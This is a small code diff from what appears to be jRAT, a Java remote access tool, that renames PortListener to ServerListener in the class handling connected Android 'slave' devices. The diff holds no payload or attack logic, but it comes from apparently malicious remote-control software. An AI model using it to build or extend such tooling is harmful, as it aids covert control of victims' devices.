@@ -15,7 +15,7 @@ import se.jrat.client.addons.PluginEventHandler;
 import se.jrat.client.crypto.GlobalKeyPair;
 import se.jrat.client.exceptions.CloseException;
 import se.jrat.client.net.ConnectionHandler;
-import se.jrat.client.net.PortListener;
+import se.jrat.client.net.ServerListener;
 import se.jrat.client.packets.android.incoming.IncomingAndroidPackets;
 import se.jrat.client.packets.android.outgoing.AbstractOutgoingAndroidPacket;
 import se.jrat.client.packets.android.outgoing.AndroidPacket0Ping;
@@ -28,7 +28,7 @@ import se.jrat.common.hash.Sha1;
 
 public class AndroidSlave extends AbstractSlave {
 	
-	public AndroidSlave(PortListener connection, Socket socket) {
+	public AndroidSlave(ServerListener connection, Socket socket) {
 		super(connection, socket);
 		new Thread(this).start();
 	}
